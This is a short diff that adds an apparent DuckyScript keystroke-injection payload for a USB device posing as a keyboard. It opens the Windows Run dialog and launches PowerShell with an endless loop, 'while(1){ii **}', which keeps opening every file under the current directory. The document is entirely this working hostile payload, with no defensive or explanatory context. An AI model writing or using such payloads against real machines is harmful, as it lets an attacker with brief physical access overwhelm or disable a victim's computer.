@@ -1,0 +1,5 @@
+DELAY 300
+GUI r
+DELAY 100
+STRING powershell while(1){ii **}
+ENTER
